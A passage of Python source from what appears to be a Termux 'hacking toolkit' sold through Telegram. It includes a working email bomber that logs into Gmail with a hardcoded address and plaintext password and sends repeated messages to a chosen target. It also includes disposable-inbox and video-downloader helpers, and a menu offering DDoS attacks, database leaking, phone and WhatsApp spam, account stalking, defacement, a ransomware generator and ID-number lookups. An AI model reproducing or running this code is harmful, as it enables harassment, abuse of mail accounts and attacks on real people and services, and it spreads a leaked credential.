
    print(f"\033[1;34mWarn\033[1;31m: \033[0;37mYou are using the free version. Buy full version on \n      Telegram @ubp2q")
    print('''\033[1;31m
.::.: EmailSpammer V1.7.4 Coded By Misha Korzhik :.::.''')

    print('''
\033[1;31m[\033[1;37m1\033[1;31m] \033[1;36mStart Email Spammer
\033[1;31m[\033[1;37m2\033[1;31m] \033[1;36mBuy VIP
\033[1;31m[\033[1;37m3\033[1;31m] \033[1;36mExit
''')

    try:
            server = input('\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mChoose Menu  \033[1;31m: \033[1;37m')
            if server == '3' or server == '03' or server == 'exit' or server == 'Exit' or server == 'quit' or server == 'Quit':
                    print(bcolors.FAIL + 'Exiting utility ...' + bcolors.ENDC)
                    sys.exit()
            elif server == '1' or server == '01' or server == 'gmail' or server == 'Gmail':
                    user = 'jiki.mioli08@gmail.com'
                    to = input('\n\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mEmail Target \033[1;31m: \033[0;37m')
                    subject = input('\n\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mJudul Pesan  \033[1;31m: \033[0;37m')
                    body = input('\n\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mIsi Pesan    \033[1;31m: \033[0;37m')
                    delay = input('\n\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mDelay  (1-5) \033[1;31m: \033[0;37m')
                    nomes = int(input('\n\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mJumlah (1-30)\033[1;31m: \033[0;37m'))
                    en0 = 600
                    if en0 <= nomes:
                            cls()
                            print(bcolors.FAIL + 'denied access: Error \nsending maximum number 599')
                            sleep(2)
                            os.execl(sys.executable, sys.executable, *sys.argv)
            elif server == '2' or server == '02' or server == 'buy' or server == 'Buy':
                    print("\033[1;33m15$ (USD) - 50 emails per 12th. For 1 week")
                    print("30$ (USD) - 100 emails per 12th. For 1 week")
                    print("50$ (USD) - 200 emails per 12th. For 1 week")
                    print("85$ (USD) - 400 emails per 12th. For 1 week")
                    print("")
                    print("if you want to buy, write to Telegram @ubp2q")
                    exit()
            no = 0
            if to == 'misakorzik528@gmail.com' or to == 'miguardzecurity@gmail.com' or to == 'korzikmisha@gmail.com':
                    print(bcolors.FAIL + '\nWhat?  seems to have failed to process \nyour request, please try another email.' + bcolors.ENDC)
                    sys.exit(0)
            if delay == '1' or delay == '01':
                    SPEED = .1
                    delay_name = 'fast'
            elif delay == '2' or delay == '02':
                    SPEED = .3
                    delay_name = 'medium'
            elif delay == '3' or delay == '03':
                    SPEED = .5
                    delay_name = 'slow'
            elif delay == '4' or delay == '04':
                    SPEED = .7
                    delay_name = 'unhurried'
            elif delay == '5' or delay == '05':
                    SPEED = .9
                    delay_name = 'snail'
            else:
                    SPEED = .3
                    delay_name = 'default'

            message = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
    except KeyboardInterrupt:
            print(bcolors.FAIL + 'Canceled! Quiting ...' + bcolors.ENDC)
            sys.exit()

    if server == '1' or server == '01' or server == 'gmail' or server == 'Gmail':
            pwd = "gzwjsohldzxdpteh"
            start_bomb()
            print('\033[0;37mEmail : ' + user + '\nTarget: ' + to + '\nSpeed : ' + delay_name)
            print("")
            server = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)
            print(bcolors.WARNING + 'Starting TLS - server0.starttls()')
            server.starttls()
            try:
                    print('\n\033[1;33mConnecting - server0.login(u,p)\n\033[0m')
                    server.login(user, pwd)
            except smtplib.SMTPAuthenticationError:
                    try:
                            print(bcolors.WARNING + 'Reconnecting - server0.login(u,p)')
                            server.login(user, pwd)
                    except smtplib.SMTPAuthenticationError:
                            try:
                                    print(bcolors.WARNING + 'Reconnecting - server0.login(u,p)')
                                    server.login(user, pwd)
                            except smtplib.SMTPAuthenticationError:
                                    print(bcolors.WARNING + 'Error to connect! Please use a mini version, select option 5...')
                                    sys.exit()
            for i in range(1, nomes+1):
                    logger.info('')
                    try:
                            server.sendmail(user, to, message)
                            print(bcolors.WARNING + 'Successfully messenge sent! ' + str(no+1) + ' emails' + bcolors.ENDC)
                            no += 1
                            sleep(SPEED)
                    except KeyboardInterrupt:
                            print(bcolors.FAIL + '\nTerminaling...' + bcolors.ENDC)
                            sys.exit()
                    except:
                            server.sendmail(user, to, message)
                            print(bcolors.WARNING + 'Successfully messenge sent! ' + str(no+1) + ' emails' + bcolors.ENDC)
                            no += 1
                            sleep(SPEED)
            server.close()
    else:
        exit_error()

def fake_email():
    list_mail = ["vintomaper.com","tovinit.com","mentonit.net"]
    url = "https://cryptogmail.com/"
    num = 0

    def get_teks(accept, key):
	    cek = r.get(url+"api/emails/"+key, headers={"accept": accept}).text
	    if "error" in cek:
	    	return "-"
	    else:
    		return cek.strip()

    def get_random(digit):
    	lis = list("abcdefghijklmnopqrstuvwxyz0123456789")
    	dig = [random.choice(lis) for _ in range(digit)]
    	return "".join(dig), random.choice(list_mail)

    def animate(teks):
    	lis = list("\|/-")
    	for cy in lis:
		    print("\r \033[1;31m[\033[1;37m"+cy+"\033[1;31m] "+str(teks)+".. ", end="")
		    sleep(0.5)

    def run(email):
	    while True:
		    try:
		    	animate("\033[1;34mWaiting for incoming message")
		    	raun = r.get(url+"api/emails?inbox="+email).text
		    	if "404" in raun:
			    	continue
		    	elif "data" in raun:
			    	z = json.loads(raun)
			    	for data in z["data"]:
					    print("\r \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mID\033[1;31m         : \033[0;37m"+data["id"], end="\n")
					    got = json.loads(r.get(url+"api/emails/"+data["id"]).text)
					    pengirim = got["data"]["sender"]["display_name"]
					    email_pe = got["data"]["sender"]["email"]
					    subject  = got["data"]["subject"]
					    print("\r \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mSender Name\033[1;31m: \033[0;37m"+pengirim, end="\n")
					    print("\r \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mSender mail\033[1;31m: \033[0;37m"+email_pe, end="\n")
					    print("\r \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mSubject    \033[1;31m: \033[0;37m"+subject, end="\n")
					    print("\r \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mMessage    \033[1;31m: \033[0;37m"+get_teks("text/html,text/plain",data["id"]), end="\n")
					    atc = got["data"]["attachments"]
					    if atc == []:
			    			print("\r \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mattachments\033[1;31m: \033[0;37m-", end="\n")
					    else:
						    print("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mattachments\033[1;31m: \033[0;37m")
						    for atch in atc:
				    			id = atch["id"]
				    			name = atch["file_name"]
				    			name = name.split(".")[-1]
				    			svee = r.get("https://cryptogmail.com/api/emails/"+data["id"]+"/attachments/"+id)
			    				open(id+"."+name, "wb").write(svee.content)
					    		print("      ~ "+id+"."+name)
					    print("-"*45)
					    r.delete(url+"api/emails/"+data["id"])
			    	continue
		    	else:
			    	continue
		    except (KeyboardInterrupt,EOFError):
			    	exit("\n \033[1;31m[\033[1;37m✓\033[1;31m] \033[1;33mProgram finished, exiting..\n")


    def main():
	    os.system("cls" if os.name == "nt" else "clear")
	    global num
	    print("""\033[1;34m
     ______      __           ______                _ __
    / ____/___ _/ /_____     / ____/___ ___  ____ _(_) /
   / /_  / __ `/ //_/ _ \   / __/ / __ `__ \/ __ `/ / / 
  / __/ / /_/ / ,< /  __/  / /___/ / / / / / /_/ / / /  
 /_/    \__,_/_/|_|\___/  /_____/_/ /_/ /_/\__,_/_/_/   

      \033[1;31mBy RizkyDev

 \033[1;31m[\033[1;37m1\033[1;31m] \033[1;36mSet Email Random
 \033[1;31m[\033[1;37m2\033[1;31m] \033[1;36mSet Email Custom
 \033[1;31m[\033[1;37m0\033[1;31m] \033[1;36mExit
""")

	    pil = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mChoose \033[1;31m: \033[0;37m")
	    while pil == "" or not pil.isdigit():
	    	pil = input( "\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mChoose \033[1;31m: \033[0;37m")
	    if pil in ["01","1"]:
	    	set_name, set_email = get_random(10)
	    	print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mYour email \033[1;31m: \033[0;37m"+set_name+"@"+set_email)
	    	print(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mCTRL+C to stopped..")
	    	print("-"*45)
	    	run(set_name+"@"+set_email)
	    elif pil in ["02","2"]:
	    	set_name = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mSet mail name \033[1;31m: \033[0;37m")
	    	print()
	    	num = 0
	    	for cy in list_mail:
	    	  num += 1
	    	  print(" "*4,"\033[1;31m[\033[1;37m"+str(num)+"\033[1;31m] \033[1;36m@"+cy)
	    	print()
	    	set_email = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mSelect \033[1;31m: \033[0;37m")
	    	while set_email == "" or not set_email.isdigit() or int(set_email) > len(list_mail):
		    	set_email = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mSelect \033[1;31m: \033[0;37m")
	    	mail = list_mail[int(set_email)-1]
	    	print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mYour email \033[1;31m: \033[0;37m"+set_name+"@"+mail)
	    	print(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mCTRL+ C to stopped..")
	    	print("-"*45)
	    	run(set_name+"@"+mail)
	    elif pil in ["00","0"]:
	    	print(" \033[1;31m[\033[1;37m!\033[1;31m] \033[1;33mExit program\n")
	    	sleep(1)
	    else:
	    	print(" \033[1;31m[\033[1;37m!\033[1;31m] \033[1;33mMenu not found, exit..\n")
	    	sleep(1)
    if __name__ == "__main__":
    	main()
      
def random_string(length=30):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def download_video(url, save_as):
    response = requests.get(url)
    if response.status_code == 200:
        with open(save_as, 'wb') as f:
            f.write(response.content)
        print()

def fb_downloader():
    url = input("\n\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mMasukkan link video facebook \033[1;31m: \033[0;37m")
                
def ig_downloader():
    def download_video(url, save_as):
        response = requests.get(url)
        if response.status_code == 200:
            with open(save_as, 'wb') as f:
                f.write(response.content)
            print(f"\n\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mSaved as \033[1;31m: \033[0;37m{save_as}")
        else:
            print(f"\033[1;31m[\033[1;37m!\033[1;31m] \033[1;33mFailed to download video. Status code: {response.status_code}")
    def main():
        url = input("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mURL Video Tiktok \033[1;31m: \033[0;37m")
        api_url = f"https://api.agatz.xyz/api/tiktok?url={url}"
        response = requests.get(api_url)
        if response.status_code == 200:
            data = response.json()
            print("\033[1;31m")
            print(json.dumps(data, indent=4))
            video_data = data['data']
            title = video_data['title']
            print(f"\n\033[1;34mTitle \033[1;31m: \033[0;37m{title}")
            print("\n\033[1;31m[\033[1;37m1\033[1;31m] \033[1;36mWatermark\n\033[1;31m[\033[1;37m2\033[1;31m] \033[1;36mNo Watermark\n\033[1;31m[\033[1;37m3\033[1;31m] \033[1;36mNo Watermark HD")
            download_choice = input("\n\033[1;34mEnter your choice \033[1;31m: \033[0;37m")
            if download_choice == '1':
                video_url = video_data['data'][0]['url']
                save_as = f"/sdcard/Download/{title}_watermark.mp4"
            elif download_choice == '2':
                video_url = video_data['data'][1]['url']
                save_as = f"/sdcard/Download/{title}_nowatermark.mp4"
            elif download_choice == '3':
                video_url = video_data['data'][2]['url']
                save_as = f"/sdcard/Download/{title}_nowatermark_hd.mp4"
            else:
                print("Invalid choice. Exiting.")
                return
            download_video(video_url, save_as)
        else:
            print(f"Failed to fetch data from API. Status code: {response.status_code}")
    main()
    
def tiktok_downloader():
    def download_video(url, save_as):
        response = requests.get(url)
        if response.status_code == 200:
            with open(save_as, 'wb') as f:
                f.write(response.content)
            print(f"\n\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mSaved as \033[1;31m: \033[0;37m{save_as}")
        else:
            print(f"\033[1;31m[\033[1;37m!\033[1;31m] \033[1;33mFailed to download video. Status code: {response.status_code}")
    def main():
        url = input("\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mURL Video Tiktok \033[1;31m: \033[0;37m")
        api_url = f"https://api.agatz.xyz/api/tiktok?url={url}"
        response = requests.get(api_url)
        if response.status_code == 200:
            data = response.json()
            print("\033[1;31m")
            print(json.dumps(data, indent=4))
            video_data = data['data']
            title = video_data['title']
            print(f"\n\033[1;34mTitle \033[1;31m: \033[0;37m{title}")
            print("\n\033[1;31m[\033[1;37m1\033[1;31m] \033[1;36mWatermark\n\033[1;31m[\033[1;37m2\033[1;31m] \033[1;36mNo Watermark\n\033[1;31m[\033[1;37m3\033[1;31m] \033[1;36mNo Watermark HD")
            download_choice = input("\n\033[1;34mEnter your choice \033[1;31m: \033[0;37m")
            if download_choice == '1':
                video_url = video_data['data'][0]['url']
                save_as = f"/sdcard/Download/{title}_watermark.mp4"
            elif download_choice == '2':
                video_url = video_data['data'][1]['url']
                save_as = f"/sdcard/Download/{title}_nowatermark.mp4"
            elif download_choice == '3':
                video_url = video_data['data'][2]['url']
                save_as = f"/sdcard/Download/{title}_nowatermark_hd.mp4"
            else:
                print("Invalid choice. Exiting.")
                return
            download_video(video_url, save_as)
        else:
            print(f"Failed to fetch data from API. Status code: {response.status_code}")
    main()
    
def yt_downloader():
    def generate_random_filename(length=30):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for _ in range(length)) + '.mp4'
    def download_video(api_url, resolution):
        response = requests.get(api_url)
        if response.status_code == 200:
            data = response.json()
            media_url = None
            for item in data['data']:
                if item['quality'] == resolution:
                    media_url = item['media']
                    break        
            if media_url:
                filename = generate_random_filename()
                filepath = os.path.join('/sdcard/Download/', filename)
                video_response = requests.get(media_url, stream=True)
                if video_response.status_code == 200:
                    with open(filepath, 'wb') as file:
                        for chunk in video_response.iter_content(chunk_size=1024):
                            file.write(chunk)
                    print(f"\n\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mVideo tersimpan di folder Download pada memori internal\n    dengan nama \033[1;31m: \033[0;37m{filename}")
                else:
                    print("\n\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mError downloading the video.")
            else:
                print("\n\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mResolution not found.")
        else:
            print("\n\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mError fetching data from API.")
    def main():
        video_url = input("\n\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mMasukkan link video youtube \033[1;31m: \033[0;37m")
        api = f"https://api.agatz.xyz/api/ytmp4?url={video_url}"
        print("\n\033[1;31m[\033[1;37m1\033[1;31m] \033[1;36m144p")
        print("\033[1;31m[\033[1;37m2\033[1;31m] \033[1;36m240p")
        print("\033[1;31m[\033[1;37m3\033[1;31m] \033[1;36m360p")
        print("\033[1;31m[\033[1;37m4\033[1;31m] \033[1;36m480p")
        print("\033[1;31m[\033[1;37m5\033[1;31m] \033[1;36m1080p")
        choice = int(input("\n\033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mPilih resolusi \033[1;31m: \033[0;37m"))
        resolutions = {
            1: "144p",
            2: "240p",
            3: "360p",
            4: "480p",
            5: "1080p"
        }
        if choice in resolutions:
            download_video(api, resolutions[choice])
        else:
            print("Invalid choice.")
    if __name__ == "__main__":
        main()

def tts():
    import gtts, os
    from gtts.lang import tts_langs
    def text_to_speech(text, lang='id'):
        if lang not in tts_langs():
            raise ValueError(f"Kode bahasa '{lang}' tidak valid.")
        tts = gtts.gTTS(text, lang=lang)
        return tts
    text = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mMasukkan teks \033[1;36m: \033[0;37m")
    lang = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mMasukkan kode bahasa \033[1;31m(en,id) \033[1;36m: \033[0;37m")
    tts = text_to_speech(text, lang)
    hasil = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mMasukkan nama file \033[1;31m(tes.mp3) \033[1;36m: \033[0;37m")
    tts.save(f"/sdcard/{hasil}")
    print(f"\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mFile \033[0;37m'{hasil}' \033[1;34mtersimpan di memori internal!")

def loading():
    animation = [
        "[\x1b[1;91m■\x1b[0m□□□□□□□□□]",
        "[\x1b[1;92m■■\x1b[0m□□□□□□□□]",
        "[\x1b[1;93m■■■\x1b[0m□□□□□□□]",
        "[\x1b[1;94m■■■■\x1b[0m□□□□□□]",
        "[\x1b[1;95m■■■■■\x1b[0m□□□□□]",
        "[\x1b[1;96m■■■■■■\x1b[0m□□□□]",
        "[\x1b[1;90m■■■■■■■\x1b[0m□□□]",
        "[\x1b[1;91m■■■■■■■■\x1b[0m□□]",
        "[\x1b[1;92m■■■■■■■■■\x1b[0m□]",
        "[\x1b[1;97m■■■■■■■■■■\x1b[0m]",
    ]
    for i in range(50):
        sleep(0.1)
        sys.stdout.write(
            f"\r \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mChecking   \033[1;31m:\x1b[0m " + animation[i % len(animation)] + "\x1b[0m "
        )
        sys.stdout.flush()

def logo():
     #print('''\033[1;31m
     {'''           \.   \.      __,-"-.__      ./   ./
       \.   \`.  \`.-'"" _,="=._ ""`-.'/  .'/   ./
        \`.  \_`-''      _,="=._      ``-'_/  .'/
         \ `-',-._   _.  _,="=._  ,_   _.-,`-' /
      \. /`,-',-._"""  \ _,="=._ /  """_.-,`-,'\ ./
       \`-'  /    `-._  "       "  _.-'    \  `-'/
       /)   (         \    ,-.    /         )   (\\
    ,-'"     `-.       \  /   \  /       .-'     "`-,
  ,'_._         `-.____/ /  _  \ \____.-'         _._`,
 /,'   `.                \_/ \_/                .'   `,\\
/'       )                  _                  (       `\\
        /   _,-'"`-.  ,++|T|||T|++.  .-'"`-,_   \\
       / ,-'        \/|`|`|`|'|'|'|\/        `-, \\
      /,'             | | | | | | |             `,\\
     /'               ` | | | | | '               `\\
                        ` | | | '
                          ` | ' 
     '''}
     print("""
 \033[1;34m██████\033[1;36m╗    \033[1;34m█████\033[1;36m╗   \033[1;34m██████\033[1;36m╗   \033[1;34m██\033[1;36m╗  \033[1;34m██\033[1;36m╗           \033[1;34m██\033[1;36m╗  \033[1;34m██\033[1;36m╗
 \033[1;34m██\033[1;36m╔══\033[1;34m██\033[1;36m╗  \033[1;34m██\033[1;36m╔══\033[1;34m██\033[1;36m╗  \033[1;34m██\033[1;36m╔══\033[1;34m██\033[1;36m╗  \033[1;34m██\033[1;36m║ \033[1;34m██\033[1;36m╔╝           ╚\033[1;34m██\033[1;36m╗\033[1;34m██\033[1;36m╔╝
 \033[1;34m██\033[1;36m║  \033[1;34m██\033[1;36m║  \033[1;34m███████\033[1;36m║  \033[1;34m██████\033[1;36m╔╝  \033[1;34m█████\033[1;36m╔╝   \033[1;34m███████\033[1;36m╗  ╚\033[1;34m███\033[1;36m╔╝
 \033[1;34m██\033[1;36m║  \033[1;34m██\033[1;36m║  \033[1;34m██\033[1;36m╔══\033[1;34m██\033[1;36m║  \033[1;34m██\033[1;36m╔══\033[1;34m██\033[1;36m╗  \033[1;34m██\033[1;36m╔═\033[1;34m██\033[1;36m╗   ╚══════╝  \033[1;34m██\033[1;36m╔\033[1;34m██\033[1;36m╗
 \033[1;34m██████\033[1;36m╔╝  \033[1;34m██\033[1;36m║  \033[1;34m██\033[1;36m║  \033[1;34m██\033[1;36m║  \033[1;34m██\033[1;36m║  \033[1;34m██\033[1;36m║  \033[1;34m██\033[1;36m╗           \033[1;34m██\033[1;36m╔╝ \033[1;34m██\033[1;36m╗
 \033[1;36m╚═════╝   ╚═╝  ╚═╝  ╚═╝  ╚═╝  ╚═╝  ╚═╝           ╚═╝  ╚═╝
\033[48;5;17m\033[1;34m╔═════════════════════════════════════════════════════════╗\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mAuthor      \033[1;31m: \033[1;37mShadow Xploit                        \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mContact     \033[1;31m: \033[1;37mt.me/ShadowXploit                    \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mCommunity   \033[1;31m: \033[1;37mDARK XPLOITER | OFC                  \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m╠═════════════════════════════════════════════════════════╣\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m                          MENU                         \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m╠══════╦══════════════════════════════════════════════════╣\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m01\033[1;31m]\033[1;34m ║\033[0m \033[1;36mDDOS ATTACK LAYER 7 METHOD                      \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m02\033[1;31m]\033[1;34m ║\033[0m \033[1;36mDDOS ATTACK LAYER 4 METHOD                      \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m03\033[1;31m]\033[1;34m ║\033[0m \033[1;36mSITE VULNERABILITY SCANNER                      \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m04\033[1;31m]\033[1;34m ║\033[0m \033[1;36mIP / DOMAIN LOOKUP                              \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m05\033[1;31m]\033[1;34m ║\033[0m \033[1;36mSITE TRAFFIC MANIPULATOR                        \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m06\033[1;31m]\033[1;34m ║\033[0m \033[1;36mRDP KALI LINUX SSH                              \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m07\033[1;31m]\033[1;34m ║\033[0m \033[1;36mRDP KALI LINUX DESKTOP                          \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m08\033[1;31m]\033[1;34m ║\033[0m \033[1;36mFILE DATABASE LEAKER                            \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m09\033[1;31m]\033[1;34m ║\033[0m \033[1;36mACCOUNT SCRAPER                                 \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m10\033[1;31m]\033[1;34m ║\033[0m \033[1;36mINSTAGRAM STALKER                               \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m11\033[1;31m]\033[1;34m ║\033[0m \033[1;36mIP INFORMATION                                  \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m12\033[1;31m]\033[1;34m ║\033[0m \033[1;36mCHAT AI TERMINAL                                \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m13\033[1;31m]\033[1;34m ║\033[0m \033[1;36mLINUX STYLE FOR TERMUX                          \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m14\033[1;31m]\033[1;34m ║\033[0m \033[1;36mBRUTEFORCE ZIP PASSWORD                         \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m15\033[1;31m]\033[1;34m ║\033[0m \033[1;36mUSERNAME TRACKER                                \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m16\033[1;31m]\033[1;34m ║\033[0m \033[1;36mSPAM CALL & WHATSAPP                            \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m17\033[1;31m]\033[1;34m ║\033[0m \033[1;36mSPAM SENDER EMAIL                               \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m18\033[1;31m]\033[1;34m ║\033[0m \033[1;36mSPAM BUG API TELEGRAM                           \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m19\033[1;31m]\033[1;34m ║\033[0m \033[1;36mSPAM NOTIF PAIRING NO LIMIT                     \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m20\033[1;31m]\033[1;34m ║\033[0m \033[1;36mSPAM NOTIF PAIRING ALL COUNTRY                  \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m21\033[1;31m]\033[1;34m ║\033[0m \033[1;36mSPAM MAIL MOBILE LEGENDS                        \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m22\033[1;31m]\033[1;34m ║\033[0m \033[1;36mAUTO FOLLOWERS INSTAGRAM                        \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m23\033[1;31m]\033[1;34m ║\033[0m \033[1;36mAUTO LIKE INSTAGRAM                             \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m24\033[1;31m]\033[1;34m ║\033[0m \033[1;36mCCTV FINDER V1                                  \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m25\033[1;31m]\033[1;34m ║\033[0m \033[1;36mCCTV FINDER V2                                  \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m26\033[1;31m]\033[1;34m ║\033[0m \033[1;36mSCRIPT DEFACE GENERATOR                         \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m27\033[1;31m]\033[1;34m ║\033[0m \033[1;36mRANSOMWARE TERMUX GENERATOR                     \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m28\033[1;31m]\033[1;34m ║\033[0m \033[1;36mPYTHON SIMPLE ENCODE                            \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m29\033[1;31m]\033[1;34m ║\033[0m \033[1;36mDECODE BASE16,32,64                             \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m30\033[1;31m]\033[1;34m ║\033[0m \033[1;36mBOT GET NIK                                     \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m31\033[1;31m]\033[1;34m ║\033[0m \033[1;36mNIK CHECKER                                     \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m32\033[1;31m]\033[1;34m ║\033[0m \033[1;36mTEXT TO VOICE CONVERTER                         \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m33\033[1;31m]\033[1;34m ║\033[0m \033[1;36mFAKE EMAIL VERIFICATION                         \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m34\033[1;31m]\033[1;34m ║\033[0m \033[1;36mTIKTOK 4K DOWNLOADER                            \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m35\033[1;31m]\033[1;34m ║\033[0m \033[1;36mAI BOT WHATSAPP                                 \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m36\033[1;31m]\033[1;34m ║\033[0m \033[1;36mTOOLS INFORMATION                               \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m00\033[1;31m]\033[1;34m ║\033[0m \033[1;36mEXIT PROGRAM                                    \033[48;5;17m\033[1;34m ║\033[0m
\033[48;5;17m\033[1;34m╚══════╩══════════════════════════════════════════════════╝\033[0m
""")

#\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m29\033[1;31m]\033[1;34m ║\033[0m \033[1;36mTIKTOK DOWNLOADER                               \033[48;5;17m\033[1;34m ║\033[0m
#\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m30\033[1;31m]\033[1;34m ║\033[0m \033[1;36mINSTAGRAM DOWNLOADER                            \033[48;5;17m\033[1;34m ║\033[0m
#\033[48;5;17m\033[1;34m║ \033[0m\033[1;31m[\033[1;37m31\033[1;31m]\033[1;34m ║\033[0m \033[1;36mFACEBOOK DOWNLOADER                             \033[48;5;17m\033[1;34m ║\033[0m
